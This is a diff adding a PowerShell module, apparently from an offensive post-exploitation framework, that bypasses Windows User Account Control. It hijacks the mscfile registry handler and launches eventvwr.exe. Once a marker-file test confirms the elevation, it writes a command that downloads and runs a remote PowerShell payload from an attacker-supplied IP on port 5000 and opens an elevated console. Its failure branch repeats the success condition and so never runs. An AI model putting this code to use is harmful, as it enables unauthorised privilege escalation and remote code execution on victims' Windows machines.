@@ -1,0 +1,76 @@
+
+
+
+
+
+
+
+function invoke-eventvwr{
+    param(
+      [String] $ip
+    )
+
+    $path = 'hkcu:\software\classes\mscfile\shell\open\command'
+
+    
+
+    if(-not(Test-Path -Path $path))
+    {
+
+      $exec = mkdir -Force hkcu:\software\classes\mscfile\shell\open\command
+    }
+
+    
+
+    $value = "c:\windows\system32\cmd.exe /K echo attpwn > c:\attpwn"
+    $exec = New-ItemProperty -Name '(Default)' -Value $value -Path $path
+    Start-Process C:\windows\System32\eventvwr.exe
+    sleep 1
+
+    
+
+    $good = (Test-Path -Path "c:\attpwn")
+
+    
+
+    $value = "c:\windows\system32\cmd.exe /K del c:\attpwn"
+    $exec = New-ItemProperty -Name '(Default)' -Value $value -Path $path
+    Start-Process C:\windows\System32\eventvwr.exe
+    sleep 1
+
+    
+
+    if($good)
+    {
+          $uri = "http://" + $ip + ":5000/consola"
+          $value = "c:\windows\system32\windowspowershell\v1.0\powershell.exe -W maximized -C iex(new-object net.webclient).downloadstring('"+$uri+"');consola -id $global:id"
+          $result = New-ItemProperty -Name '(Default)' -Value $value -Path $path | Out-String
+          $result = $result + " Bypass done! -> New 'Consola' with privilege"
+          Start-Process C:\windows\System32\eventvwr.exe
+          sleep 1
+    }
+    elseif($good)
+    {
+          $result = "No Bypass UAC"
+    }
+
+    rm -Force -Recurse 'hkcu:\software\classes\mscfile'
+    return @{results=$result;success=$good}
+
+  }
+
+  
+
+  $execute = {}
+
+  
+
+
+  
+
+  $execute = invoke-eventvwr -ip $global:remoteip
+
+  
+
+
+  return $execute
